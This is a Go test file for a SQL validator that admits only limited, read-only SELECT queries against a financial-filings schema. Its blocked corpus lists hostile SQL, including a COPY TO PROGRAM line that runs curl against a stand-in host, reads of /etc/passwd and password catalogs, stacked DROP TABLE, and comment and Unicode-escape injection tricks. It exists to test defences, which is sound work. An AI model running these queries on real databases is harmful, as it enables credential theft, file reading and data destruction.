package sqlguard

import (
	"strings"
	"testing"

	pg_query "github.com/pganalyze/pg_query_go/v6"
)

func testValidator(t testing.TB) Validator {
	t.Helper()
	p, err := LoadPolicy("../db/sql_policy.json")
	if err != nil {
		t.Fatal(err)
	}
	return Validator{P: p}
}

// blocked: every one of these must be rejected.
var blocked = []struct{ name, sql string }{
	// DML / DDL / utility statements
	{"insert", "INSERT INTO companies (cik, ticker, name) VALUES ('1','X','X')"},
	{"update", "UPDATE companies SET name = 'x'"},
	{"delete", "DELETE FROM companies"},
	{"truncate", "TRUNCATE companies"},
	{"drop table", "DROP TABLE companies"},
	{"create table", "CREATE TABLE evil (id int)"},
	{"create table as", "CREATE TABLE evil AS SELECT * FROM companies"},
	{"alter", "ALTER TABLE companies ADD COLUMN x int"},
	{"grant", "GRANT ALL ON companies TO PUBLIC"},
	{"copy to program", "COPY companies TO PROGRAM 'curl evil.example'"},
	{"create function", "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql"},
	{"do block", "DO $$ BEGIN PERFORM pg_sleep(100); END $$"},
	{"call", "CALL some_proc()"},
	{"set role", "SET ROLE postgres"},
	{"set timeout", "SET statement_timeout = 0"},
	{"reset", "RESET ALL"},
	{"explain analyze", "EXPLAIN ANALYZE SELECT * FROM companies"},
	{"vacuum", "VACUUM companies"},
	{"listen", "LISTEN chan"},
	{"begin", "BEGIN"},
	{"prepare", "PREPARE p AS SELECT 1"},
	{"show", "SHOW ALL"},
	{"create extension", "CREATE EXTENSION dblink"},
	{"create role", "CREATE ROLE evil SUPERUSER LOGIN"},
	{"lock", "LOCK TABLE companies"},
	// stacked statements
	{"stacked drop", "SELECT * FROM companies; DROP TABLE companies"},
	{"two selects", "SELECT 1; SELECT 2"},
	// system catalogs / other tables
	{"pg_catalog.pg_tables", "SELECT * FROM pg_catalog.pg_tables"},
	{"pg_tables bare", "SELECT * FROM pg_tables"},
	{"information_schema", "SELECT * FROM information_schema.tables"},
	{"pg_shadow", "SELECT * FROM pg_shadow"},
	{"pg_authid", "SELECT usename FROM pg_authid"},
	{"public.pg_class", "SELECT * FROM public.pg_class"},
	{"chunks table", "SELECT * FROM chunks"},
	{"query_traces table", "SELECT * FROM query_traces"},
	{"other database", "SELECT * FROM otherdb.public.companies"},
	{"subquery catalog", "SELECT (SELECT passwd FROM pg_shadow)"},
	{"exists catalog", "SELECT 1 WHERE EXISTS (SELECT 1 FROM pg_roles)"},
	{"union catalog", "SELECT ticker FROM companies UNION SELECT usename FROM pg_user"},
	{"quoted identifier escape", `SELECT * FROM U&"pg\005fshadow"`},
	{"case-sensitive quoted name", `SELECT * FROM "Companies"`},
	// dangerous functions
	{"pg_sleep", "SELECT pg_sleep(10)"},
	{"pg_sleep in from clause row", "SELECT pg_sleep(1) FROM companies"},
	{"version", "SELECT version()"},
	{"current_setting", "SELECT current_setting('server_version')"},
	{"set_config", "SELECT set_config('a', 'b', false)"},
	{"pg_read_file", "SELECT pg_read_file('/etc/passwd')"},
	{"lo_import", "SELECT lo_import('/etc/passwd')"},
	{"qualified function", "SELECT pg_catalog.version()"},
	{"generate_series", "SELECT * FROM generate_series(1, 100000000)"},
	{"current_user", "SELECT current_user"},
	{"current_date", "SELECT current_date"},
	{"array_agg not allowed", "SELECT array_agg(ticker) FROM companies"},
	{"string_agg not allowed", "SELECT string_agg(ticker, ',') FROM companies"},
	// SELECT variants that write or lock
	{"for update", "SELECT * FROM companies FOR UPDATE"},
	{"select into", "SELECT * INTO newt FROM companies"},
	{"cte delete", "WITH d AS (DELETE FROM companies RETURNING *) SELECT * FROM d"},
	{"cte insert", "WITH i AS (INSERT INTO companies (cik,ticker,name) VALUES ('1','x','y') RETURNING *) SELECT * FROM i"},
	{"recursive cte", "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r) SELECT * FROM r"},
	// comments
	{"line comment", "SELECT 1 -- hi"},
	{"block comment", "SELECT /* x */ 1"},
	{"comment hiding tail", "SELECT * FROM companies WHERE ticker = 'A' --'; DROP TABLE companies"},
	// types / operators / constructs
	{"regclass cast", "SELECT 'pg_shadow'::regclass"},
	{"oid cast", "SELECT 1::oid"},
	{"xml cast", "SELECT '<a/>'::xml"},
	{"array type cast", "SELECT '{1}'::int[]"},
	{"qualified operator", "SELECT 1 OPERATOR(pg_catalog.+) 2"},
	{"row constructor", "SELECT ROW(1, 2)"},
	{"array subscript", "SELECT (ARRAY[1,2])[1]"},
	{"parameter", "SELECT $1"},
	{"tablesample", "SELECT * FROM companies TABLESAMPLE SYSTEM (10)"},
	{"lateral", "SELECT * FROM companies, LATERAL (SELECT 1) l"},
	{"values list", "SELECT * FROM (VALUES (1)) v"},
	// columns
	{"unknown column on table", "SELECT companies.secret FROM companies"},
	{"unknown column on alias", "SELECT c.password FROM companies c"},
	{"unknown qualifier", "SELECT x.ticker FROM companies c"},
	{"three-part column", "SELECT public.companies.ticker FROM companies"},
	// limits
	{"non-constant limit", "SELECT * FROM companies LIMIT (SELECT 5)"},
	{"negative limit", "SELECT * FROM companies LIMIT -1"},
	{"subquery offset", "SELECT * FROM companies OFFSET (SELECT 1)"},
	// malformed / hostile input
	{"empty", ""},
	{"whitespace", "   \n\t "},
	{"semicolon only", ";"},
	{"typo", "SELEC 1"},
	{"missing select list", "SELECT FROM WHERE"},
	{"unterminated string", "SELECT 'oops"},
	{"nul byte", "SELECT 1\x00"},
	{"too long", "SELECT " + strings.Repeat("1,", 3000) + "1"},
	{"many subqueries", "SELECT " + strings.Repeat("(SELECT 1),", 20) + " 1"},
}

// valid: all of these must pass.
var valid = []struct{ name, sql string }{
	{"simple", "SELECT ticker, name FROM companies ORDER BY ticker"},
	{"star", "SELECT * FROM companies"},
	{"count", "SELECT count(*) FROM xbrl_facts"},
	{"constant", "SELECT 1"},
	{"join filter", "SELECT c.ticker, x.value FROM companies c JOIN xbrl_facts x ON x.company_id = c.id WHERE x.concept = 'NetIncomeLoss' AND x.fiscal_year = 2025 AND x.unit = 'USD'"},
	{"aggregate group having", "SELECT c.ticker, sum(x.value) AS total FROM companies c JOIN xbrl_facts x ON x.company_id = c.id WHERE x.unit = 'USD' GROUP BY c.ticker HAVING sum(x.value) > 0"},
	{"round and division", "SELECT round(x.value / 1e9, 2) AS billions FROM xbrl_facts x WHERE x.concept = 'Assets'"},
	{"window lag growth", "SELECT fiscal_year, value, value / lag(value) OVER (ORDER BY fiscal_year) - 1 AS growth FROM xbrl_facts WHERE concept = 'NetIncomeLoss' AND unit = 'USD'"},
	{"cte join", "WITH rev AS (SELECT company_id, value FROM xbrl_facts WHERE concept = 'Revenues' AND fiscal_year = 2025), ni AS (SELECT company_id, value FROM xbrl_facts WHERE concept = 'NetIncomeLoss' AND fiscal_year = 2025) SELECT c.ticker, ni.value / rev.value AS margin FROM rev JOIN ni ON ni.company_id = rev.company_id JOIN companies c ON c.id = rev.company_id"},
	{"cte alias columns", "WITH t AS (SELECT ticker AS tk FROM companies) SELECT t.tk FROM t"},
	{"subquery in", "SELECT value FROM xbrl_facts WHERE company_id IN (SELECT id FROM companies WHERE ticker IN ('AAPL', 'MSFT'))"},
	{"exists", "SELECT c.ticker FROM companies c WHERE EXISTS (SELECT 1 FROM filings f WHERE f.company_id = c.id AND f.fiscal_year = 2025)"},
	{"case when", "SELECT CASE WHEN value > 0 THEN 'pos' ELSE 'neg' END FROM xbrl_facts"},
	{"coalesce nullif", "SELECT COALESCE(NULLIF(value, 0), 1) FROM xbrl_facts"},
	{"casts", "SELECT CAST(value AS numeric), value::float8, fiscal_year::text FROM xbrl_facts"},
	{"between like ilike", "SELECT * FROM companies WHERE name ILIKE '%corp%' AND id BETWEEN 1 AND 10 AND ticker LIKE 'A%'"},
	{"distinct count", "SELECT count(DISTINCT concept) FROM xbrl_facts"},
	{"union all", "SELECT ticker FROM companies WHERE id = 1 UNION ALL SELECT ticker FROM companies WHERE id = 2"},
	{"filings join", "SELECT f.fiscal_year, f.period_end FROM filings f JOIN companies c ON c.id = f.company_id WHERE c.ticker = 'AAPL'"},
	{"limit offset", "SELECT * FROM companies ORDER BY id LIMIT 5 OFFSET 2"},
	{"string concat", "SELECT ticker || ' - ' || name FROM companies"},
	{"public schema", "SELECT * FROM public.companies"},
	{"order nulls", "SELECT value FROM xbrl_facts ORDER BY value DESC NULLS LAST"},
	{"min max avg", "SELECT min(value), max(value), avg(value) FROM xbrl_facts"},
	{"date compare", "SELECT * FROM filings WHERE period_end >= '2024-01-01'::date"},
	{"array in", "SELECT * FROM companies WHERE ticker = ANY(ARRAY['AAPL', 'MSFT'])"},
	{"is null distinct", "SELECT * FROM xbrl_facts WHERE period_start IS NULL AND value IS DISTINCT FROM 0"},
	{"self join", "SELECT a.ticker, b.ticker FROM companies a JOIN companies b ON a.id < b.id"},
	{"rank", "SELECT ticker, rank() OVER (ORDER BY id) FROM companies"},
}

func TestBlocksAdversarialCorpus(t *testing.T) {
	v := testValidator(t)
	if len(blocked) < 40 {
		t.Fatalf("corpus too small: %d", len(blocked))
	}
	for _, c := range blocked {
		t.Run(c.name, func(t *testing.T) {
			r := v.Validate(c.sql)
			if r.OK {
				t.Fatalf("ALLOWED a query that must be blocked:\n%s\n-> %s", c.sql, r.SQL)
			}
			if len(r.Reasons) == 0 || r.SQL != "" {
				t.Errorf("blocked result needs reasons and no SQL: %+v", r)
			}
		})
	}
}

func TestAllowsValidQueries(t *testing.T) {
	v := testValidator(t)
	if len(valid) < 20 {
		t.Fatalf("corpus too small: %d", len(valid))
	}
	for _, c := range valid {
		t.Run(c.name, func(t *testing.T) {
			r := v.Validate(c.sql)
			if !r.OK {
				t.Fatalf("rejected a valid query:\n%s\nreasons: %v", c.sql, r.Reasons)
			}
			if !strings.Contains(strings.ToUpper(r.SQL), "LIMIT") {
				t.Errorf("no LIMIT in returned SQL: %s", r.SQL)
			}
		})
	}
}

// What runs is the deparsed tree, so purely syntactic tricks (redundant parentheses, odd spacing, keyword case)
// are normalised away instead of reaching Postgres.
func TestSyntacticNoiseIsNormalisedAway(t *testing.T) {
	v := testValidator(t)
	deep := v.Validate("SELECT " + strings.Repeat("(", 600) + "1" + strings.Repeat(")", 600))
	if !deep.OK || deep.SQL != "SELECT 1 LIMIT 50" {
		t.Errorf("deep parentheses: %+v", deep)
	}
	messy := v.Validate("  sElEcT   TICKER\n\tfRoM   companies  ")
	if !messy.OK || messy.SQL != "SELECT ticker FROM companies LIMIT 50" {
		t.Errorf("messy: %+v", messy)
	}
}

func TestLimitEnforcement(t *testing.T) {
	v := testValidator(t)
	for _, c := range []struct{ in, want string }{
		{"SELECT * FROM companies", "LIMIT 50"},
		{"SELECT * FROM companies LIMIT 5", "LIMIT 5"},
		{"SELECT * FROM companies LIMIT 100000", "LIMIT 200"},
		{"SELECT * FROM companies LIMIT ALL", "LIMIT 200"},
		{"SELECT * FROM companies LIMIT 200", "LIMIT 200"},
		{"SELECT ticker FROM companies UNION SELECT ticker FROM companies", "LIMIT 50"},
	} {
		r := v.Validate(c.in)
		if !r.OK || !strings.HasSuffix(r.SQL, c.want) {
			t.Errorf("%q -> ok=%v sql=%q want suffix %q (%v)", c.in, r.OK, r.SQL, c.want, r.Reasons)
		}
	}
}

func TestOutputIsStableAndRevalidates(t *testing.T) {
	v := testValidator(t)
	for _, c := range valid {
		first := v.Validate(c.sql)
		if !first.OK {
			continue
		}
		second := v.Validate(first.SQL)
		if !second.OK || second.SQL != first.SQL {
			t.Errorf("%s: output not a fixed point:\n%s\n%s (%v)", c.name, first.SQL, second.SQL, second.Reasons)
		}
	}
}

func TestReasonsAreInformative(t *testing.T) {
	v := testValidator(t)
	cases := map[string]string{
		"SELECT * FROM pg_shadow":                  "disallowed_table",
		"SELECT pg_sleep(1)":                       "disallowed_function",
		"DELETE FROM companies":                    "not_select",
		"SELECT 1; SELECT 2":                       "multiple_statements",
		"SELECT 1 -- x":                            "comment",
		"SELECT c.password FROM companies c":       "disallowed_column",
		"SELEC 1":                                  "syntax_error",
		"SELECT * FROM companies FOR UPDATE":       "locking",
		"SELECT * INTO x FROM companies":           "select_into",
		"SELECT * FROM companies LIMIT (SELECT 1)": "limit",
	}
	for sql, code := range cases {
		r := v.Validate(sql)
		if r.OK || !strings.HasPrefix(strings.Join(r.Reasons, "|"), code) && !strings.Contains(strings.Join(r.Reasons, "|"), code) {
			t.Errorf("%q: want reason %q, got %+v", sql, code, r)
		}
	}
}

func TestMultipleViolationsAreAllReported(t *testing.T) {
	r := testValidator(t).Validate("SELECT pg_sleep(1), version() FROM pg_shadow")
	if r.OK || len(r.Reasons) < 3 {
		t.Errorf("expected several reasons, got %+v", r)
	}
}

func TestPolicyParsing(t *testing.T) {
	good := `{"version":1,"max_limit":10,"default_limit":5,"tables":{"T":{"columns":{"A":"x"}}},"functions":["SUM"]}`
	p, err := ParsePolicy([]byte(good))
	if err != nil || !p.Tables["t"]["a"] || !p.Functions["sum"] {
		t.Fatalf("%v %+v", err, p)
	}
	for _, bad := range []string{
		`not json`,
		`{"version":2,"max_limit":10,"default_limit":5,"tables":{"t":{"columns":{}}}}`,
		`{"version":1,"max_limit":10,"default_limit":5,"tables":{}}`,
		`{"version":1,"max_limit":5,"default_limit":10,"tables":{"t":{"columns":{}}}}`,
		`{"version":1,"max_limit":0,"default_limit":0,"tables":{"t":{"columns":{}}}}`,
	} {
		if _, err := ParsePolicy([]byte(bad)); err == nil {
			t.Errorf("expected error for %s", bad)
		}
	}
}

// FuzzValidate: whatever the input, Validate must not panic, and anything it accepts must be a single
// comment-free SELECT with a LIMIT that survives re-parsing.
func FuzzValidate(f *testing.F) {
	for _, c := range blocked {
		f.Add(c.sql)
	}
	for _, c := range valid {
		f.Add(c.sql)
	}
	v := testValidator(f)
	f.Fuzz(func(t *testing.T, sql string) {
		r := v.Validate(sql)
		if !r.OK {
			return
		}
		tree, err := pg_query.Parse(r.SQL)
		if err != nil || len(tree.Stmts) != 1 || tree.Stmts[0].Stmt.GetSelectStmt() == nil {
			t.Fatalf("accepted SQL does not re-parse as one SELECT: %q -> %q (%v)", sql, r.SQL, err)
		}
		if tree.Stmts[0].Stmt.GetSelectStmt().LimitCount == nil {
			t.Fatalf("accepted SQL has no LIMIT: %q", r.SQL)
		}
		scan, _ := pg_query.Scan(r.SQL)
		for _, tk := range scan.Tokens {
			if tk.Token == pg_query.Token_SQL_COMMENT || tk.Token == pg_query.Token_C_COMMENT {
				t.Fatalf("accepted SQL contains a comment: %q", r.SQL)
			}
		}
	})
}
